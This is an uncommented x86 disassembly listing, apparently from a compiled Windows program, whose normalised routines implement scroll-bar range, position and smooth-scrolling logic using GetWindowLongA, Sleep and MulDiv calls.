movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_452ab8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413ebc
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_453380
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_453360
mov edx [ edi + 0xc ]
mov eax ebx
call sub_453210
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_452b08
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_452cc0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43c258
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_453210
xor edx edx
mov eax ebx
call sub_453210
jmp r-xdata
sub_452b40
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421f24
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_452bac
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421f24
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_452c14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_453348
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43f0fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_453348
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43f0c0
call sub_452bac
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43f0c0
call sub_452b40
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_452cc0
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4423cc
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_452cf8
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4423cc
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_452d2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_452cf8
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_452cf8
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_452da8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4423cc
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_452d2c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b5d0
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_452d2c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b614
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_452e40
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4423cc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_452ea0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_453071 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_452da8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_452da8
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_453210
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
push ebp
call sub_452e40
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
push ebp
call sub_452e40
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406820
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_453210
jmp r-xdata
sub_453198
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_453888
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_453210
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4423cc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4423cc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_441f84
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_441f84
jmp r-xdata
call sub_452980
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4532d4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_453888
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_45338c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4423cc
push eax
call sub_4248e8
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4423cc
push eax
call sub_4248e8
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4423cc
push eax
call sub_4248e8
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41bfbc
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4423cc
push eax
call sub_4248e8
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4423cc
push eax
call sub_4248e8
sub_453494
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_452da8
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_452da8
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_45338c
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4423cc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_453210
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_452da8
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_4535ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43e0f8
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_452a28
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_452a28
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_453624
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403224
mov eax [ esi + 0x20c ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43e21c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_453670
push ebx
mov ebx eax
mov eax ebx
call sub_43f384
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_453888
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bc20
test al al
jne r-xdata
mov eax ebx
call sub_4423cc
push eax
call sub_42491c
sub_4536b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_453808
mov ecx edi
mov edx esi
mov eax ebx
call sub_43eacc
pop edi
pop esi
pop ebx
retn
sub_4536f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4537f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43b5d0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_452cc0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_453210
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4137bc
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43b33c
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4537ff
mov eax [ ebp - 0x10 ]
call sub_403224
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_452b08
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_413918
xor ecx ecx
mov edx 0xb03e
call sub_43cd98
inc ebx
dec esi
jne r-xdata
sub_45382c
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_453360
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_453360
mov eax ebx
call sub_453808
jmp r-xdata
sub_453888
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4426d0
test al al
je r-xdata
xor eax eax
push ebp
push sub_453973
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_452e28
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_452e28
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_453494
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_453494
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_453494
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_453494
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_453494
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_453494
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_453998
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43b6e4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43b710
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43b6e4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43b710
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43b5d0
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_453210
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43b5d0
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43b614
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_453210
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_43b5d0
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_453210
mov eax ebx
call sub_43b5d0
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43b614
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_43b614
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_453210
mov eax ebx
call sub_43b614
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_453aec
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_453210
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_453210
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_453360
push edi
push esi
